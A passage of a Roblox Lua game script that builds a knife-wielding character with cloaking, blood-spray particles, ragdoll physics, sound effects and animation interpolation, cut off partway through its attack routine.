	local NEWPART = IT("Part")
	NEWPART.formFactor = FORMFACTOR
	NEWPART.Reflectance = REFLECTANCE
	NEWPART.Transparency = TRANSPARENCY
	NEWPART.CanCollide = false
	NEWPART.Locked = true
	NEWPART.Anchored = true
	if ANCHOR == false then
		NEWPART.Anchored = false
	end
	NEWPART.BrickColor = BRICKC(tostring(BRICKCOLOR))
	NEWPART.Name = NAME
	NEWPART.Size = SIZE
	NEWPART.Position = Torso.Position
	NEWPART.Material = MATERIAL
	NEWPART:BreakJoints()
	NEWPART.Parent = PARENT
	return NEWPART
end

	local function weldBetween(a, b)
	    local weldd = Instance.new("ManualWeld")
	    weldd.Part0 = a
	    weldd.Part1 = b
	    weldd.C0 = CFrame.new()
	    weldd.C1 = b.CFrame:inverse() * a.CFrame
	    weldd.Parent = a
	    return weldd
	end


function QuaternionFromCFrame(cf)
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
	local trace = m00 + m11 + m22
	if trace > 0 then 
		local s = math.sqrt(1 + trace)
		local recip = 0.5 / s
		return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
	else
		local i = 0
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then
			i = 2
		end
		if i == 0 then
			local s = math.sqrt(m00 - m11 - m22 + 1)
			local recip = 0.5 / s
			return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
		elseif i == 1 then
			local s = math.sqrt(m11 - m22 - m00 + 1)
			local recip = 0.5 / s
			return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
		elseif i == 2 then
			local s = math.sqrt(m22 - m00 - m11 + 1)
			local recip = 0.5 / s return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
		end
	end
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w)
	local xs, ys, zs = x + x, y + y, z + z
	local wx, wy, wz = w * xs, w * ys, w * zs
	local xx = x * xs
	local xy = x * ys
	local xz = x * zs
	local yy = y * ys
	local yz = y * zs
	local zz = z * zs
	return CFrame.new(px, py, pz, 1 - (yy + zz), xy - wz, xz + wy, xy + wz, 1 - (xx + zz), yz - wx, xz - wy, yz + wx, 1 - (xx + yy))
end
 
function QuaternionSlerp(a, b, t)
	local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
	local startInterp, finishInterp;
	if cosTheta >= 0.0001 then
		if (1 - cosTheta) > 0.0001 then
			local theta = ACOS(cosTheta)
			local invSinTheta = 1 / SIN(theta)
			startInterp = SIN((1 - t) * theta) * invSinTheta
			finishInterp = SIN(t * theta) * invSinTheta
		else
			startInterp = 1 - t
			finishInterp = t
		end
	else
		if (1 + cosTheta) > 0.0001 then
			local theta = ACOS(-cosTheta)
			local invSinTheta = 1 / SIN(theta)
			startInterp = SIN((t - 1) * theta) * invSinTheta
			finishInterp = SIN(t * theta) * invSinTheta
		else
			startInterp = t - 1
			finishInterp = t
		end
	end
	return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] * startInterp + b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
end

function Clerp(a, b, t)
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)}
	local ax, ay, az = a.x, a.y, a.z
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1 - t
	return QuaternionToCFrame(_t * ax + t * bx, _t * ay + t * by, _t * az + t * bz, QuaternionSlerp(qa, qb, t))
end

function CreateFrame(PARENT, TRANSPARENCY, BORDERSIZEPIXEL, POSITION, SIZE, COLOR, BORDERCOLOR, NAME)
	local frame = IT("Frame")
	frame.BackgroundTransparency = TRANSPARENCY
	frame.BorderSizePixel = BORDERSIZEPIXEL
	frame.Position = POSITION
	frame.Size = SIZE
	frame.BackgroundColor3 = COLOR
	frame.BorderColor3 = BORDERCOLOR
	frame.Name = NAME
	frame.Parent = PARENT
	return frame
end

function CreateLabel(PARENT, TEXT, TEXTCOLOR, TEXTFONTSIZE, TEXTFONT, TRANSPARENCY, BORDERSIZEPIXEL, STROKETRANSPARENCY, NAME)
	local label = IT("TextLabel")
	label.BackgroundTransparency = 1
	label.Size = UD2(1, 0, 1, 0)
	label.Position = UD2(0, 0, 0, 0)
	label.TextColor3 = TEXTCOLOR
	label.TextStrokeTransparency = STROKETRANSPARENCY
	label.TextTransparency = TRANSPARENCY
	label.FontSize = TEXTFONTSIZE
	label.Font = TEXTFONT
	label.BorderSizePixel = BORDERSIZEPIXEL
	label.TextScaled = false
	label.Text = TEXT
	label.Name = NAME
	label.Parent = PARENT
	return label
end

function NoOutlines(PART)
	PART.TopSurface, PART.BottomSurface, PART.LeftSurface, PART.RightSurface, PART.FrontSurface, PART.BackSurface = 10, 10, 10, 10, 10, 10
end

function CreateWeldOrSnapOrMotor(TYPE, PARENT, PART0, PART1, C0, C1)
	local NEWWELD = IT(TYPE)
	NEWWELD.Part0 = PART0
	NEWWELD.Part1 = PART1
	NEWWELD.C0 = C0
	NEWWELD.C1 = C1
	NEWWELD.Parent = PARENT
	return NEWWELD
end

local S = IT("Sound")
function CreateSound(ID, PARENT, VOLUME, PITCH, DOESLOOP)
	local NEWSOUND = nil
	coroutine.resume(coroutine.create(function()
		NEWSOUND = S:Clone()
		NEWSOUND.Parent = PARENT
		NEWSOUND.Volume = VOLUME
		NEWSOUND.Pitch = PITCH
		NEWSOUND.SoundId = "http://www.roblox.com/asset/id="..ID
		NEWSOUND:play()
		if DOESLOOP == true then
			NEWSOUND.Looped = true
		else
			repeat wait(1) until NEWSOUND.Playing == false
			NEWSOUND:remove()
		end
	end))
	return NEWSOUND
end

function MakeForm(PART,TYPE)
	if TYPE == "Cyl" then
		local MSH = IT("CylinderMesh",PART)
	elseif TYPE == "Ball" then
		local MSH = IT("SpecialMesh",PART)
		MSH.MeshType = "Sphere"
	elseif TYPE == "Wedge" then
		local MSH = IT("SpecialMesh",PART)
		MSH.MeshType = "Wedge"
	end
end

function CFrameFromTopBack(at, top, back)
	local right = top:Cross(back)
	return CF(at.x, at.y, at.z, right.x, top.x, back.x, right.y, top.y, back.y, right.z, top.z, back.z)
end

function PuddleOfBlood(Position,MaxDrop,Model,MaxSize)
	local HITFLOOR, HITPOS, NORMAL = Raycast(Position, (CF(Position, Position + VT(0, -1, 0))).lookVector, MaxDrop, Model)
	if HITFLOOR ~= nil then
		if HITFLOOR.Parent ~= Weapon and HITFLOOR.Parent ~= Character then
			if HITFLOOR.Name == "BloodPuddle" then
				local DIST = (Position - HITFLOOR.Position).Magnitude
				if (HITFLOOR.Size.Z <= 5 and HITFLOOR.Size.Z < MaxSize) or (HITFLOOR.Size.Z > 5 and HITFLOOR.Size.Z < MaxSize and DIST < HITFLOOR.Size.Z/3) then
					HITFLOOR.Size = HITFLOOR.Size + VT(0.1,0,0.1)
				end
			else
				if HITFLOOR.Anchored == true then
					local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(2,0,2))
					BLOOD.CFrame = CF(HITPOS,HITPOS+NORMAL)*ANGLES(RAD(90),RAD(0),RAD(0))
					MakeForm(BLOOD,"Cyl")
					coroutine.resume(coroutine.create(function()
						Swait(75)
						while true do
							Swait()
							BLOOD.Size = BLOOD.Size - VT(0.02,0,0.02)
							if BLOOD.Size.Z < 0.051 then
								BLOOD:remove()
								break
							end
						end
					end))
				end
			end
		end
	end
end

function SprayBlood(POSITION,DIRECTION,BloodSize)
	local BLOOD = CreatePart(3, Effects, "Glass", 0, 0, "Maroon", "BloodPuddle", VT(0.3,0.3,0.3),false)
	BLOOD.CFrame = CF(POSITION)
	MakeForm(BLOOD,"Ball")
	local bv = Instance.new("BodyVelocity",BLOOD) 
	bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
	bv.velocity = CF(POSITION,DIRECTION+VT(MRANDOM(-3,3)/30,MRANDOM(-3,3)/30,MRANDOM(-3,3)/30)).lookVector*75
	bv.Name = "MOVE"
	Debris:AddItem(bv,0.05)
	coroutine.resume(coroutine.create(function()
		local HASTOUCHEDGROUND = false
		local HIT = BLOOD.Touched:Connect(function(hit)
			if hit.Anchored == true then
				HASTOUCHEDGROUND = true
				PuddleOfBlood(BLOOD.Position+VT(0,1,0),2,BLOOD,BloodSize)
			end
		end)
		wait(5)
		if HASTOUCHEDGROUND == false then
			BLOOD:remove()
		end
	end))
end

Debris = game:GetService("Debris")

function CastProperRay(StartPos, EndPos, Distance, Ignore)
	local DIRECTION = CF(StartPos,EndPos).lookVector
	return Raycast(StartPos, DIRECTION, Distance, Ignore)
end

function turnto(position)
	RootPart.CFrame=CFrame.new(RootPart.CFrame.p,VT(position.X,RootPart.Position.Y,position.Z)) * CFrame.new(0, 0, 0)
end

function recurse(root,callback,i)
	i= i or 0
	for _,v in pairs(root:GetChildren()) do
		i = i + 1
		callback(i,v)
		
		if #v:GetChildren() > 0 then
			i = recurse(v,callback,i)
		end
	end
	
	return i
end

function ragdollJoint(character, part0, part1, attachmentName, className, properties)
	attachmentName = attachmentName.."RigAttachment"
	local constraint = Instance.new(className.."Constraint")
	constraint.Attachment0 = part0:FindFirstChild(attachmentName)
	constraint.Attachment1 = part1:FindFirstChild(attachmentName)
	constraint.Name = "RagdollConstraint"..part1.Name
	
	for _,propertyData in next,properties or {} do
		constraint[propertyData[1]] = propertyData[2]
	end
	
	constraint.Parent = character
end

function getAttachment0(character, attachmentName)
	for _,child in next,character:GetChildren() do
		local attachment = child:FindFirstChild(attachmentName)
		if attachment then
			return attachment
		end
	end
end

function R15Ragdoll(character)
	recurse(character, function(_,v)
		if v:IsA("Attachment") then
			v.Axis = Vector3.new(0, 1, 0)
			v.SecondaryAxis = Vector3.new(0, 0, 1)
			v.Rotation = Vector3.new(0, 0, 0)
		end
	end)
	for _,child in next,character:GetChildren() do
		if child:IsA("Accoutrement") then
			for _,part in next,child:GetChildren() do
				if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
					local attachment1 = part:FindFirstChildOfClass("Attachment")
					local attachment0 = getAttachment0(character,attachment1.Name)
					if attachment0 and attachment1 then
						local constraint = Instance.new("HingeConstraint")
						constraint.Attachment0 = attachment0
						constraint.Attachment1 = attachment1
						constraint.LimitsEnabled = true
						constraint.UpperAngle = 0
						constraint.LowerAngle = 0
						constraint.Parent = character
					end
				elseif part.Name == "HumanoidRootPart" then
					part:remove()
				end
			end
		end
	end
	
	ragdollJoint(character,character.LowerTorso, character.UpperTorso, "Waist", "BallSocket", {
		{"LimitsEnabled",true};
		{"UpperAngle",5};
	})
	ragdollJoint(character,character.UpperTorso, character.Head, "Neck", "BallSocket", {
		{"LimitsEnabled",true};
		{"UpperAngle",15};
	})
	
	local handProperties = {
		{"LimitsEnabled", true};
		{"UpperAngle",0};
		{"LowerAngle",0};
	}
	ragdollJoint(character,character.LeftLowerArm, character.LeftHand, "LeftWrist", "Hinge", handProperties)
	ragdollJoint(character,character.RightLowerArm, character.RightHand, "RightWrist", "Hinge", handProperties)
	
	local shinProperties = {
		{"LimitsEnabled", true};
		{"UpperAngle", 0};
		{"LowerAngle", -75};
	}
	ragdollJoint(character,character.LeftUpperLeg, character.LeftLowerLeg, "LeftKnee", "Hinge", shinProperties)
	ragdollJoint(character,character.RightUpperLeg, character.RightLowerLeg, "RightKnee", "Hinge", shinProperties)
	
	local footProperties = {
		{"LimitsEnabled", true};
		{"UpperAngle", 15};
		{"LowerAngle", -45};
	}
	ragdollJoint(character,character.LeftLowerLeg, character.LeftFoot, "LeftAnkle", "Hinge", footProperties)
	ragdollJoint(character,character.RightLowerLeg, character.RightFoot, "RightAnkle", "Hinge", footProperties)
	
	ragdollJoint(character,character.UpperTorso, character.LeftUpperArm, "LeftShoulder", "BallSocket")
	ragdollJoint(character,character.LeftUpperArm, character.LeftLowerArm, "LeftElbow", "BallSocket")
	ragdollJoint(character,character.UpperTorso, character.RightUpperArm, "RightShoulder", "BallSocket")
	ragdollJoint(character,character.RightUpperArm, character.RightLowerArm, "RightElbow", "BallSocket")
	ragdollJoint(character,character.LowerTorso, character.LeftUpperLeg, "LeftHip", "BallSocket")
	ragdollJoint(character,character.LowerTorso, character.RightUpperLeg, "RightHip", "BallSocket")
end

function Ragdoll(Character2,CharTorso)
	Character2:BreakJoints()
	local hum = Character2:findFirstChild("Humanoid")
	hum:remove()
	local function Scan(ch)
		local e
		for e = 1,#ch do
			Scan(ch[e]:GetChildren())
			if ch[e].ClassName == "Weld" or ch[e].ClassName == "Motor6D" then
				ch[e]:remove()
			end
		end
	end
	local NEWHUM = IT("Humanoid")
	NEWHUM.Name = "Corpse"
	NEWHUM.Health = 26
	NEWHUM.MaxHealth = 26
	NEWHUM.PlatformStand = true
	NEWHUM.Parent = Character2
	NEWHUM.DisplayDistanceType = "None"

	local ch = Character2:GetChildren()
	local i
	for i = 1,#ch do
		if ch[i].Name == "THandle1" or ch[i].Name == "THandle2" then
			ch[i]:remove()
		end
	end

	local Torso2 = Character2.Torso
	local movevector = Vector3.new()

	if Torso2 then
		movevector = CFrame.new(CharTorso.Position,Torso2.Position).lookVector
		local Head = Character2:FindFirstChild("Head")
		if Head then
			local Neck = Instance.new("Weld")
			Neck.Name = "Neck"
			Neck.Part0 = Torso2
			Neck.Part1 = Head
			Neck.C0 = CFrame.new(0, 1.5, 0)
			Neck.C1 = CFrame.new()
			Neck.Parent = Torso2

		end
		local Limb = Character2:FindFirstChild("Right Arm")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(1.5, 0, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "RightShoulder"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.C1 = CFrame.new(-0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		local Limb = Character2:FindFirstChild("Left Arm")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(-1.5, 0, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "LeftShoulder"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(-1.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.C1 = CFrame.new(0, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		local Limb = Character2:FindFirstChild("Right Leg")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(0.5, -2, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "RightHip"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		local Limb = Character2:FindFirstChild("Left Leg")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(-0.5, -2, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "LeftHip"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		--[
		local Bar = Instance.new("Part")
		Bar.TopSurface = 0
		Bar.BottomSurface = 0
		Bar.formFactor = "Symmetric"
		Bar.Size = Vector3.new(1, 1, 1)
		Bar.Transparency = 1
		Bar.CFrame = Torso2.CFrame * CFrame.new(0, 0.5, 0)
		Bar.Parent = Character2
		local Weld = Instance.new("Weld")
		Weld.Part0 = Torso2
		Weld.Part1 = Bar
		Weld.C0 = CFrame.new(0, 0.5, 0)
		Weld.Parent = Torso2
		--]]
	end
	Character2.Parent = workspace
	Debris:AddItem(Character2,5)

	return Character2,Torso2
end

--//=================================\\
--||	     WEAPON CREATION
--\\=================================//

local Knife = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,1.2,0.2),false)
local Grip = CreateWeldOrSnapOrMotor("Weld", RightArm, RightArm, Knife, CF(0,-1.2, -0.5) * ANGLES(RAD(0), RAD(0), RAD(180)) * ANGLES(RAD(45), RAD(0), RAD(0)), CF(0, 0.3, 0))
CreateMesh("SpecialMesh", Knife, "FileMesh", "", "", VT(0.2,0.2,0.2), VT(0,0,0))
local A = IT("Attachment",Knife)
A.Position = VT(-0, 0.2, 0.136)
local B = IT("Attachment",Knife)
B.Position = VT(-0, -0.95, -0.982)
local Trail = IT("Trail",Knife)
Trail.Attachment0 = B
Trail.Attachment1 = A
Trail.Lifetime = 0.1
Trail.Transparency = NumberSequence.new(0.5, 1)
Trail.Texture = "http://www.roblox.com/asset/id=1472703539"
Trail.Enabled = true
Humanoid.DisplayDistanceType = "None"
Humanoid.MaxHealth = 800
Humanoid.Health = 800

local STEP = CreateSound(131436155, Torso, 3, 1, true)
STEP.Playing = false
STEP.Looped = false
local STEPPING = false
Humanoid.Running:Connect(function(speed)
	if STEPPING == false then
		STEPPING = true
		repeat
			local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
			wait(8/TORSOVELOCITY)
			local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
			if TORSOVELOCITY > 1 and Torso.Transparency ~= 1 and HITFLOOR ~= nil then
				STEP.Parent = Torso
				STEP.Pitch = MRANDOM(8,12)/10
				STEP:Play()
			end
		until TORSOVELOCITY < 0.6
		STEPPING = false
	end
end)

for _, c in pairs(Weapon:GetChildren()) do
	if c.ClassName == "Part" then
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
	end
end

local SKILLTEXTCOLOR = C3(0,0,0)
local SKILLFONT = "SciFi"
local SKILLTEXTSIZE = 7

Weapon.Parent = Character

Humanoid.Died:connect(function()
	ATTACK = true
end)

--//=================================\\
--||	     DAMAGE FUNCTIONS
--\\=================================//

function StatLabel(CFRAME, TEXT, COLOR)
end

--//=================================\\
--||			DAMAGING
--\\=================================//

function ApplyDamage(Humanoid,Damage,TorsoPart)
end

function ApplyAoE(POSITION,RANGE,MINDMG,MAXDMG,FLING,INSTAKILL)
end

--//=================================\\
--||	ATTACK FUNCTIONS AND STUFF
--\\=================================//

function Cloaked()
	CLOAKED = true
	Speed = 0
	local POS = RootPart.Position
	local DISTANCE = 99999
	for i = 1, 15 do
		wait()
		for _, c in pairs(Character:GetChildren()) do
			if c:IsA("BasePart") and c ~= RootPart then
				c.Transparency = c.Transparency + 1/15
			elseif c.ClassName == "Accessory" then
				c.Handle.Transparency = c.Handle.Transparency + 1/15
			end
		end
		Trail.Transparency = NumberSequence.new(0.5+((i/15)/2), 1)
		Knife.Transparency = 1
	end
	Speed = 5
	repeat
		wait()
		DISTANCE = (RootPart.Position - POS).Magnitude
	until DISTANCE > 45 or CLOAKED == false
	Speed = 0
	for i = 1, 15 do
		wait()
		for _, c in pairs(Character:GetChildren()) do
			if c:IsA("BasePart") and c ~= RootPart then
				c.Transparency = 1 - i/15
			elseif c.ClassName == "Accessory" then
				c.Handle.Transparency = 1 - i/15
			end
		end
		Trail.Transparency = NumberSequence.new(1-((0.5/15)*i), 1)
		Knife.Transparency = 1
	end
	Speed = 12
	CLOAKED = false
end

function Attack()
	PLAYANIMS = false
	ATTACK = true
	Rooted = false
	local TARGET = nil
	Knife.CanCollide = true
	local HUMAN = nil
	local TORSOPART = nil
	local HIT = Knife.Touched:Connect(function(hit)
		if hit.Parent:FindFirstChildOfClass("Humanoid") then
			local HITBODY = hit.Parent
			local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
			local TORSO = HITBODY:FindFirstChild("Torso") or HITBODY:FindFirstChild("UpperTorso")
			
				
			end
	end)
	
	for i=0, 0.4, 0.1 / Animation_Speed do
		Swait()
		if TARGET then
			break
		end
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
	end
	CreateSound(143501853,Knife,2,MRANDOM(8,13)/10,false)
	for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		if TARGET then
			break
		end
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(35)), 1 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(-35)), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.5, -0.4) * ANGLES(RAD(90), RAD(0), RAD(35)) * ANGLES(RAD(0), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.25, 0.5, -0.3) * ANGLES(RAD(90), RAD(0), RAD(35)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
	end
	Knife.CanCollide = false
	if TARGET then
		CLOAKED = false
		local DISPOSE = false
		Rooted = true
		coroutine.resume(coroutine.create(function()
			repeat
				Swait()
				if TORSOPART then
					TORSOPART.Anchored = true
					TORSOPART.CFrame = RootPart.CFrame*CF(0,0,-2.2)
				end
			until DISPOSE == true
			TORSOPART.Anchored = false
		end))
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.75, -1.3) * ANGLES(RAD(90), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		CreateSound(28144268,Knife,2,MRANDOM(8,13)/10,false)
		CreateSound(180083298,TORSOPART,5,MRANDOM(8,13)/10,false)
		coroutine.resume(coroutine.create(function()
			for i = 1, 750 do
				Swait()
				if HUMAN and TORSOPART then
					if HUMAN.Health > 25 then
						SprayBlood(TORSOPART.CFrame*CF(0,TORSOPART.Size.Y/2,-TORSOPART.Size.Z/2).p,TORSOPART.CFrame*CF(MRANDOM(-3,3)/15,TORSOPART.Size.Y+MRANDOM(-3,3)/35,-TORSOPART.Size.Z*MRANDOM(8,25)/10).p,MRANDOM(15,35)/10)
						HUMAN.Health = HUMAN.Health - 25
						HUMAN.WalkSpeed = MRANDOM(5,45)
					else
						break
					end
				else
					break
				end
			end
			local SCREAMS = {160718677,337800380}
			if HUMAN and TORSOPART then
				if HUMAN.Health == 26 then
					local HEAD = TORSOPART.Parent:FindFirstChild("Head")
					if HEAD then
						CreateSound(SCREAMS[MRANDOM(1,#SCREAMS)],HEAD,5,MRANDOM(13,15)/10,false)
						local FACE = HEAD:FindFirstChild("face")
						if FACE then
							FACE.Texture = "http://www.roblox.com/asset/id=145854465"
						end
					end
					if TORSOPART.Name == "Torso" then
						Ragdoll(TORSOPART.Parent,Torso)
					elseif TORSOPART.Name == "UpperTorso" then
						R15Ragdoll(TORSOPART.Parent)
					end
				end
				HUMAN.WalkSpeed = 16
			end
		end))
		for i=0, 0.2, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(2, 0.75, -1.3) * ANGLES(RAD(90), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		DISPOSE = true
		local bv = Instance.new("BodyVelocity") 
		bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
		bv.velocity = CF(TORSOPART.Position,TORSOPART.CFrame*CF(0,5,-15).p).lookVector*75
		bv.Parent = TORSOPART
		Debris:AddItem(bv,0.05)
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-35)), 1 / Animation_Speed)
